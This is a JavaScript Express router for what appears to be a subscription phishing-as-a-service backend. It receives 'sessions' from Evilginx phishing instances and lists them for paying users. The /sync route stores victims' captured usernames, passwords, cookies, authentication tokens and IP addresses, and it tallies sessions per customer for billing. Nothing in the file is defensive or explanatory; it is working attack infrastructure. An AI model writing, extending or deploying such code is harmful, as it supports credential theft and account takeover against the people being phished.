const express = require('express');
const router = express.Router();
const { authenticate, requireSubscription } = require('../middleware/auth');

let pool;
setTimeout(() => { pool = require('../server').pool; }, 100);

// GET /api/sessions - List user's captured sessions
router.get('/', authenticate, requireSubscription, async (req, res) => {
    try {
        const { page = 1, limit = 50, phishlet, instanceId } = req.query;
        const offset = (page - 1) * limit;

        let query = 'SELECT * FROM sessions WHERE user_id = $1';
        const params = [req.user.id];

        if (phishlet) {
            params.push(phishlet);
            query += ` AND phishlet = $${params.length}`;
        }

        if (instanceId) {
            params.push(instanceId);
            query += ` AND instance_id = $${params.length}`;
        }

        query += ` ORDER BY captured_at DESC LIMIT $${params.length + 1} OFFSET $${params.length + 2}`;
        params.push(limit, offset);

        const result = await pool.query(query, params);
        
        // Get total count
        const countResult = await pool.query(
            'SELECT COUNT(*) FROM sessions WHERE user_id = $1',
            [req.user.id]
        );

        res.json({
            success: true,
            data: {
                sessions: result.rows,
                total: parseInt(countResult.rows[0].count),
                page: parseInt(page),
                limit: parseInt(limit)
            }
        });

    } catch (error) {
        console.error('Sessions fetch error:', error);
        res.status(500).json({ success: false, message: 'Error fetching sessions' });
    }
});

// POST /api/sessions/sync - Sync session from Evilginx instance
router.post('/sync', async (req, res) => {
    try {
        const { instanceApiKey, session } = req.body;

        // Verify instance
        const instanceResult = await pool.query(
            'SELECT id, user_id FROM instances WHERE api_key = $1',
            [instanceApiKey]
        );

        if (instanceResult.rows.length === 0) {
            return res.status(401).json({ success: false, message: 'Invalid instance API key' });
        }

        const instance = instanceResult.rows[0];

        // Insert or update session
        await pool.query(
            `INSERT INTO sessions (instance_id, user_id, session_sid, phishlet, username, password, landing_url, user_agent, remote_addr, cookies, tokens, custom_data)
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)
             ON CONFLICT (instance_id, session_sid) 
             DO UPDATE SET username = $5, password = $6, cookies = $10, tokens = $11, custom_data = $12`,
            [
                instance.id,
                instance.user_id,
                session.session_id,
                session.phishlet,
                session.username,
                session.password,
                session.landing_url,
                session.user_agent,
                session.remote_addr,
                JSON.stringify(session.cookies),
                JSON.stringify(session.tokens),
                JSON.stringify(session.custom)
            ]
        );

        // Update usage stats
        const now = new Date();
        await pool.query(
            `INSERT INTO usage_stats (user_id, instance_id, period_month, period_year, total_sessions)
             VALUES ($1, $2, $3, $4, 1)
             ON CONFLICT (user_id, instance_id, period_month, period_year)
             DO UPDATE SET total_sessions = usage_stats.total_sessions + 1`,
            [instance.user_id, instance.id, now.getMonth() + 1, now.getFullYear()]
        );

        res.json({ success: true, message: 'Session synced' });

    } catch (error) {
        console.error('Session sync error:', error);
        res.status(500).json({ success: false, message: 'Session sync failed' });
    }
});

module.exports = router;

